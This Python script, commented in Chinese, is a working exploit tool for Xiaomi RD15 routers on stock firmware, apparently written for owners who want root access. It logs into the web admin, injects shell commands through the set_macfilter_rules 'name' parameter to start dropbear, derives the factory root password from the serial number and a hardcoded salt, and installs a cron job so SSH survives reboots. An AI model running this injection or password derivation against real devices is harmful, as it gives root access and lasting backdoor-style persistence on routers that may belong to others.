#!/usr/bin/env python3
"""RD15（小米 BE3600 2.5G）原厂固件 SSH 工具。

三个子命令：

    unlock    登录 web 后台，通过 set_macfilter_rules 接口启动 dropbear
    password  计算原厂 root 的初始密码
    persist   安装 crond 守护，让 SSH 在重启后自动恢复

只适用于本人所有的 RD15 设备。用法见 docs/SSH-UNLOCK.md。
"""

from __future__ import annotations

import argparse
import base64
import getpass
import hashlib
import random
import re
import socket
import sys
import time
from typing import NoReturn

try:
    import requests
except ImportError:
    print("缺少依赖: pip install -r requirements.txt", file=sys.stderr)
    raise SystemExit(1)

DEFAULT_IP = "192.168.31.1"
SALT = "6d2df50a-250f-4a30-a5e6-d44fb0960aa0"
WEB_TIMEOUT = (3, 8)

SSH_TIMEOUT = 25
PERSIST_DIR = "/data/xmir_ssh"

PERSIST_SCRIPT = r"""#!/bin/sh

DIR=/data/xmir_ssh
SERVICE="$DIR/start_ssh.sh"
CRON=/etc/crontabs/root

mkdir -p "$DIR"

if [ ! -s "$DIR/dropbear_rsa_host_key" ]; then
    cp /etc/dropbear/dropbear_rsa_host_key "$DIR/dropbear_rsa_host_key"
fi
chmod 600 "$DIR/dropbear_rsa_host_key"

cat > "$SERVICE" <<'XMIR_EOF'
#!/bin/sh
DIR=/data/xmir_ssh
KEY="$DIR/dropbear_rsa_host_key"

mkdir -p /etc/dropbear
if [ ! -s /etc/dropbear/dropbear_rsa_host_key ]; then
    cp "$KEY" /etc/dropbear/dropbear_rsa_host_key
fi
chmod 700 /etc/dropbear
chmod 600 /etc/dropbear/dropbear_rsa_host_key

if ! netstat -ltn 2>/dev/null | grep -q ':22 '; then
    /usr/sbin/dropbear -p 22 >/dev/null 2>&1
fi
XMIR_EOF
chmod 755 "$SERVICE"

if [ ! -f "$DIR/crontabs.root.original" ]; then
    cp -p "$CRON" "$DIR/crontabs.root.original"
fi

if ! grep -Fq '/data/xmir_ssh/start_ssh.sh' "$CRON"; then
    if [ -s "$CRON" ] && [ -n "$(tail -c 1 "$CRON")" ]; then
        echo >> "$CRON"
    fi
    echo '* * * * * /data/xmir_ssh/start_ssh.sh' >> "$CRON"
fi

chmod 600 "$CRON"
"$SERVICE"

if [ -x /etc/init.d/cron ]; then
    /etc/init.d/cron restart >/dev/null 2>&1
else
    killall crond 2>/dev/null
    /usr/sbin/crond -c /etc/crontabs -b 2>/dev/null
fi

sleep 1
echo "persist-dir: $DIR"
echo "service-script: $SERVICE"
echo "host-key-size: $(wc -c < "$DIR/dropbear_rsa_host_key")"
echo "cron-entry:"
grep -F '/data/xmir_ssh/start_ssh.sh' "$CRON"
echo "ssh-listener:"
netstat -ltn 2>/dev/null | grep ':22 '
exit 0
"""


# ---------------------------------------------------------------- 公共函数


def fail(message: str) -> NoReturn:
    print(f"错误: {message}", file=sys.stderr)
    raise SystemExit(1)


def sha256(text: str) -> str:
    return hashlib.sha256(text.encode()).hexdigest()


def initial_root_password(serial: str) -> str:
    """原厂 root 初始密码 = md5(SN + salt) 的前 8 位。"""
    return hashlib.md5((serial + SALT).encode()).hexdigest()[:8]


def port_open(ip: str, port: int = 22, timeout: float = 1.0) -> bool:
    try:
        with socket.create_connection((ip, port), timeout=timeout):
            return True
    except OSError:
        return False


def init_info(ip: str) -> dict:
    """读取 /api/xqsystem/init_info，拿到型号和 SN。"""
    url = f"http://{ip}/cgi-bin/luci/api/xqsystem/init_info"
    try:
        response = requests.get(url, timeout=WEB_TIMEOUT)
        response.raise_for_status()
        return response.json()
    except (requests.RequestException, ValueError) as exc:
        fail(f"无法读取设备信息: {exc}")


def check_rd15(info: dict) -> None:
    hardware = (info.get("hardware") or "").upper()
    if hardware != "RD15":
        fail(f"本工具只支持 RD15，设备报告为 {hardware or '未知'}")


# ---------------------------------------------------------------- unlock


def read_login_params(ip: str) -> dict:
    """从 web 登录页里取出 deviceId 和校验用的 key。"""
    page = ""
    scheme = ""
    for candidate in ("http", "https"):
        try:
            response = requests.get(
                f"{candidate}://{ip}/cgi-bin/luci/web",
                timeout=WEB_TIMEOUT,
                verify=False,
            )
            if response.status_code == 200:
                scheme, page = candidate, response.text
                break
        except requests.RequestException:
            continue

    if not page:
        fail(f"无法访问 {ip} 的 web 后台")

    patterns = {
        "hardware": r"hardware\s*=\s*'(.*?)'",
        "rom_version": r"romVersion:\s*'(.*?)'",
        "device_id": r"var deviceId\s*=\s*'(.*?)'",
        "nonce_key": r"key:\s*'(.*?)',",
    }
    found = {name: re.search(pattern, page) for name, pattern in patterns.items()}
    missing = [name for name, match in found.items() if not match]
    if missing:
        fail(f"登录页缺少字段: {', '.join(missing)}")

    return {
        "scheme": scheme,
        "hardware": found["hardware"].group(1).upper(),
        "rom_version": found["rom_version"].group(1).strip(),
        "device_id": found["device_id"].group(1),
        "nonce_key": found["nonce_key"].group(1),
    }


def web_login(ip: str, info: dict, password: str) -> str:
    """用管理密码换 stok token。"""
    nonce = (
        f"0_{info['device_id']}_{int(time.time())}_"
        f"{random.randint(1000, 10000)}"
    )
    account_hash = sha256(password + info["nonce_key"])
    password_hash = sha256(nonce + account_hash)

    url = f"{info['scheme']}://{ip}/cgi-bin/luci/api/xqsystem/login"
    try:
        response = requests.post(
            url,
            data={
                "username": "admin",
                "password": password_hash,
                "logtype": "2",
                "nonce": nonce,
            },
            timeout=WEB_TIMEOUT,
            verify=False,
        )
        result = response.json()
    except (requests.RequestException, ValueError) as exc:
        fail(f"登录请求失败: {exc}")

    token = result.get("token")
    if not token:
        fail(f"登录被拒绝，检查 web 管理密码: {result}")
    return token


def inject(ip: str, info: dict, token: str, script: str) -> None:
    """把命令塞进 set_macfilter_rules 的 name 参数，后台会原样交给 shell。"""
    mac = "02:%02X:%02X:%02X:%02X:%02X" % tuple(
        random.randint(0, 255) for _ in range(5)
    )
    url = (
        f"{info['scheme']}://{ip}/cgi-bin/luci/;stok={token}"
        "/api/xqsystem/set_macfilter_rules"
    )
    try:
        response = requests.get(
            url,
            params={"mac": mac, "name": "\n" + script + "\n", "option": "0"},
            timeout=(3, 12),
            verify=False,
        )
    except requests.RequestException as exc:
        fail(f"命令注入请求失败: {exc}")

    try:
        result = response.json()
    except ValueError:
        return
    if result.get("code") != 0:
        fail(f"命令注入被拒绝: {result}")


def cmd_unlock(args: argparse.Namespace) -> int:
    requests.packages.urllib3.disable_warnings()

    print(f"目标: {args.ip}")
    if not args.yes:
        answer = input("确认设备为本人所有，输入 yes 继续: ").strip()
        if answer.lower() != "yes":
            fail("未确认设备所有权")

    if port_open(args.ip):
        print("22 端口已经开放，无需重复解锁。")
        return 0

    info = read_login_params(args.ip)
    print(f"型号: {info['hardware']}，固件: {info['rom_version']}")
    if info["hardware"] != "RD15":
        fail(f"只支持 RD15，当前设备为 {info['hardware']}")
    if info["rom_version"] != "1.0.87":
        print(f"注意: 只在 1.0.87 上验证过，当前是 {info['rom_version']}")

    password = getpass.getpass("路由器 web 管理密码（不是 Wi-Fi 密码）: ")
    token = web_login(args.ip, info, password)
    print("登录成功，开始注入。")

    script = "\n".join(
        [
            "mkdir -p /etc/dropbear",
            "rm -f /etc/dropbear/dropbear_rsa_host_key",
            "dropbearkey -t rsa -f /etc/dropbear/dropbear_rsa_host_key",
            "/usr/sbin/dropbear -p 22",
        ]
    )
    inject(args.ip, info, token, script)

    for _ in range(20):
        if port_open(args.ip):
            print("SSH 已启动，22 端口在监听。")
            return 0
        time.sleep(0.5)

    fail("注入返回成功，但 22 端口没有开放")


# -------------------------------------------------------------- password


def cmd_password(args: argparse.Namespace) -> int:
    if args.sn:
        serial = args.sn
    else:
        info = init_info(args.ip)
        check_rd15(info)
        serial = info.get("id") or fail("设备信息里没有 SN")

    print(f"SN:       {serial}")
    print("用户名:   root")
    print(f"密码:     {initial_root_password(serial)}")
    return 0


# --------------------------------------------------------------- persist


def _pexpect():
    try:
        import pexpect
    except ImportError:
        fail("持久化需要 pexpect，先执行 pip install pexpect")
    return pexpect


def _spawn_ssh(pexpect, ip: str, password: str):
    options = [
        "-o", "HostKeyAlgorithms=+ssh-rsa",
        "-o", "PubkeyAcceptedAlgorithms=+ssh-rsa",
        "-o", "StrictHostKeyChecking=no",
        "-o", "UserKnownHostsFile=/dev/null",
        "-o", "ConnectTimeout=8",
        f"root@{ip}",
    ]
    child = pexpect.spawn("ssh", options, encoding="utf-8", timeout=SSH_TIMEOUT)
    prompts = [
        r"(?i)password:",
        r"(?i)permission denied",
        r"(?i)no matching host key",
        pexpect.EOF,
        pexpect.TIMEOUT,
    ]
    if child.expect(prompts) != 0:
        child.close(force=True)
        return None

    child.sendline(password)
    if child.expect([r"#\s*$", r"(?i)permission denied", r"(?i)password:",
                     pexpect.EOF, pexpect.TIMEOUT]) != 0:
        child.close(force=True)
        return None

    child.sendline("stty -echo")
    child.expect(r"#\s*$")
    return child


def ssh_connect(pexpect, ip: str, password: str):
    child = _spawn_ssh(pexpect, ip, password)
    if child is not None:
        return child

    if not sys.stdin.isatty():
        fail("SSH 认证失败；可在环境变量 RD15_ROOT_PASSWORD 里提供当前密码")

    password = getpass.getpass("当前 root 密码: ")
    child = _spawn_ssh(pexpect, ip, password)
    if child is None:
        fail("SSH 认证失败")
    return child


def install_persist_script(child, pexpect) -> None:
    encoded = base64.b64encode(PERSIST_SCRIPT.encode()).decode("ascii")
    # RD15 的 busybox shell 在 PTY 下行超过 ~256 字节会丢字符，这里留足余量。
    chunk_size = 192

    def run(line: str, timeout: int = 10) -> None:
        child.sendline(line)
        child.expect(r"#\s*$", timeout=timeout)

    run(": > /tmp/xmir_persist.b64")
    for offset in range(0, len(encoded), chunk_size):
        chunk = encoded[offset:offset + chunk_size]
        run(f"printf '%s' '{chunk}' >> /tmp/xmir_persist.b64")

    marker = f"__XMIR_PERSIST_{int(time.time())}__"
    child.sendline(
        "base64 -d /tmp/xmir_persist.b64 > /tmp/xmir_persist.sh; "
        "sh /tmp/xmir_persist.sh; rc=$?; "
        "rm -f /tmp/xmir_persist.b64 /tmp/xmir_persist.sh; "
        f"echo {marker}:$rc"
    )
    child.expect(fr"{marker}:(\d+)", timeout=30)
    print(child.before.replace("\r", "").strip())
    if int(child.match.group(1)) != 0:
        fail("持久化脚本执行失败")


def wait_for_ssh(ip: str, timeout: int = 150) -> bool:
    print("等待设备重启并恢复 SSH ...", flush=True)
    deadline = time.time() + timeout
    went_down = False
    while time.time() < deadline:
        if not port_open(ip):
            went_down = True
        elif went_down:
            return True
        time.sleep(2)
    return False


def cmd_persist(args: argparse.Namespace) -> int:
    pexpect = _pexpect()

    if not port_open(args.ip):
        fail("22 端口没开，先运行 unlock")

    info = init_info(args.ip)
    check_rd15(info)
    serial = info.get("id") or fail("设备信息里没有 SN")

    import os

    password = os.environ.get("RD15_ROOT_PASSWORD") or initial_root_password(serial)
    child = ssh_connect(pexpect, args.ip, password)
    try:
        install_persist_script(child, pexpect)
        child.sendline("stty echo; exit")
        try:
            child.expect(pexpect.EOF, timeout=5)
        except pexpect.TIMEOUT:
            child.close(force=True)
    except Exception:
        child.close(force=True)
        raise

    if args.reboot:
        child = ssh_connect(pexpect, args.ip, password)
        try:
            child.sendline("reboot")
            try:
                child.expect(pexpect.EOF, timeout=10)
            except pexpect.TIMEOUT:
                child.close(force=True)
            if not wait_for_ssh(args.ip):
                fail("重启后 150 秒内 SSH 没有恢复")
            print("重启完成，SSH 已自动恢复。")
        finally:
            child.close(force=False)

    print("持久化安装完成。")
    return 0


# ------------------------------------------------------------------- CLI


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="RD15 原厂固件 SSH 工具",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "示例:\n"
            "  python3 rd15_ssh.py unlock --ip 192.168.31.1\n"
            "  python3 rd15_ssh.py password --ip 192.168.31.1\n"
            "  python3 rd15_ssh.py persist --reboot\n"
        ),
    )
    sub = parser.add_subparsers(dest="command", required=True)

    unlock = sub.add_parser("unlock", help="通过 web 后台启动 dropbear")
    unlock.add_argument("--ip", default=DEFAULT_IP)
    unlock.add_argument("--yes", action="store_true", help="跳过所有权确认")
    unlock.set_defaults(func=cmd_unlock)

    password = sub.add_parser("password", help="计算 root 初始密码")
    password.add_argument("--ip", default=DEFAULT_IP)
    password.add_argument("--sn", help="直接指定 SN，不访问路由器")
    password.set_defaults(func=cmd_password)

    persist = sub.add_parser("persist", help="安装 SSH 重启持久化")
    persist.add_argument("--ip", default=DEFAULT_IP)
    persist.add_argument("--reboot", action="store_true",
                         help="安装后重启并等待 SSH 恢复")
    persist.set_defaults(func=cmd_persist)

    return parser


def main() -> int:
    args = build_parser().parse_args()
    return args.func(args)


if __name__ == "__main__":
    raise SystemExit(main())
